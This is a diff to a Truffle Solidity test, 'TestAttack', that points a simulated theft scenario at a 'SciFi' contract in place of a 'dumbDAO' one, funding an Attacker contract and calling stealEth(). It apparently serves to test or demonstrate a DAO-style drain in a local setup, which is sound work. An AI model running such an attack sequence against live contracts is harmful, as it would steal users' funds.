@@ -2,7 +2,7 @@ pragma solidity ^0.4.2;
 
 import "truffle/Assert.sol";
 import "truffle/DeployedAddresses.sol";
-import "../contracts/dumbDAO.sol";
+import "../contracts/SciFi.sol";
 import "../contracts/Attacker.sol";
 
 contract TestAttack {
@@ -13,13 +13,13 @@ contract TestAttack {
 		uint weiToBeStolen = 50000;
 		uint weiToUseForStealing = 50000;
 
-		dumbDAO dumbdao = dumbDAO(DeployedAddresses.dumbDAO());
+		SciFi scifi = SciFi(DeployedAddresses.SciFi());
 	  Attacker attacker = Attacker(DeployedAddresses.attacker());
 
 
-		dumbdao.buyTokens.value(weiToBeStolen)();
+		scifi.vote.value(weiToBeStolen)('');
 
-		attacker.setDAOAddress(DeployedAddresses.dumbDAO());
+		attacker.setDAOAddress(DeployedAddresses.SciFi());
 		attacker.fundMe.value(weiToUseForStealing)();
 		attacker.buyDAOTokens(weiToUseForStealing);
 		attacker.stealEth();
